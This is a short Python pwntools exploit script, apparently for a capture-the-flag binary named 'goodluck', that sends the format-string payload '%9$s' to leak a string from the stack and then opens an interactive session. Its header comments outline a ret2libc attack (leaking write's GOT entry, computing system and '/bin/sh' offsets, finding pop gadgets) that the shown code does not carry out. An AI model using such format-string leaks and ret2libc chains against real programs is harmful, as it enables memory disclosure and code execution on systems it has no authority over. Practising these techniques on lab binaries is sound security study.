#NOTE: payload length should be smaller than read length - offset!!!!!!!
##prerequisite
# 1. write is called, since need to call write@plt to print out write_got.
# 2. have libc, since need to calculate offset for system and 'bin/sh' from write/read
# 3. need to compile with -no-pie, since need to find gadget
# 4. depends on how many single pop|ret gadget could be found, normally only rdi, rsi could be found
from pwn import *
context.log_level = 'debug'

p = process('./goodluck')

#4007aa:	48 83 ec 40          	sub    $0x40,%rsp
#char *v10; // [sp+18h] [bp-28h]@4
#  char v11[24]; // [sp+20h] [bp-20h]@2
#v10 = v11;  //0x40-0x28 [40, 38, 30, 28] the 4th + 5 register = 9th
p.sendline("%9$s")
print p.recv()
p.interactive()